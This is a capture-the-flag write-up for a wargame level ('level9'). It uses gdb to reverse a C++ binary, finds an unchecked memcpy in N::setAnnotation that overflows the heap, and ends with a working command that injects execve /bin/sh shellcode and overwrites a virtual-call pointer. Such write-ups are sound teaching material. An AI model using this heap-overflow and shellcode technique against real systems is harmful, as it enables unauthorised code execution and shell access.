## level9
The `level9` is slightly a bit more complicated as it is written on C++ 
```
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    ebx,eax
   [...]
~$ c++filt _Znwj
operator new(unsigned int)
```
So we suspect there's a Class being created with the operator *new* and this class looks like to have a constructor
```
0x080486f6 in N::N(int) ()
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:	push   ebp
=> 0x080486f7 <+1>:	mov    ebp,esp
   0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848
   0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
   0x0804870b <+21>:	pop    ebp
   0x0804870c <+22>:	ret
```
with an
```
(gdb) info functions
[...]
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
[...]
```
We can see the class is composed with a *__constructor__* *(constructor has same name as Class)* and three methods <br> *__setAnnotation(char \*)__*, *__operator+(N&)__* and *__operator-(N&)__* <br>
We we disassembly the *setAnnotation()* function we will find some interesting things *(a call to memcpy() which we can use to overflow the heap)*
```
(gdb) disas _ZN1N13setAnnotationEPc
   0x0804870e <+0>:	push   ebp
   0x0804870f <+1>:	mov    ebp,esp
   0x08048711 <+3>:	sub    esp,0x18
   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:	add    edx,0x4
   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
```
So the argument we pass to the prgram is being passed as argument to *setAnnotation(argv[1])* you can check it by
```
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

(gdb) b  *0x08048670
Breakpoint 1 at 0x8048670
n
=> 0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
(gdb) x/s $eax
0xbffff85c:	 'A' <repeats 110 times>
ni
ni
ni
(gdb) i r
eax            0x804a00c	134520844
ecx            0x4141	16705                    <-------------------------
edx            0x804a07a	134520954
ebx            0x804a078	134520952
esp            0xbffff650	0xbffff650
ebp            0xbffff678	0xbffff678
esi            0x0	0
edi            0x0	0
eip            0x804867c	0x804867c <main+136>
eflags         0x200283	[ CF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

```
As we can see after passing 110 characters we overwrote by two bytes `ecx` what gives us an **__offset_** of `108`
We can also see in the `main()` that the two call to `new()` returns the two __address__ 
```
0x804a008 = first  new()
0x804a078 = second new()
```
That is exactly `0x70 bytes (112)`  from each other what is probably the `malloc(sizeof(M))` we can also see that before each call a value of `0x6c bytes (108)` is passed
```
0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
``` 
We can also verify that we are calling the __address__ of the *first new()*` to  *setAnnotation()* with the string we supplied the program 
```
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
=> 0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   
(gdb) x/4xw $esp
0xbffff6b0:	0x0804a008	0xbffff8c5	0xbffff780	0xb7d79e55
(gdb) x/s 0xbffff8c5
0xbffff8c5:	 "hello"
```
After that in `main()` we see a call to `edx` that contains the __address__ of the *second new()* `0x804a078` let put a break and check
```
(gdb) b *0x08048690
Breakpoint 2 at 0x8048690
n
=> 0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
(gdb) x/4xw $eax
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
```
We now have enough information to try to get the flag, as we don't have any call to `system()` function here we will need to pass a *shellcode* as in `level2`
__Shell code__ `'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'` that gives us a total of `24 bytes` we know the *offset* is 108 - 24 for the shell code and 4 for the address what leaves us with *80 bytes* of random characters
```
./level9 $(python -c "print('\x90' * 80 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08')")
```
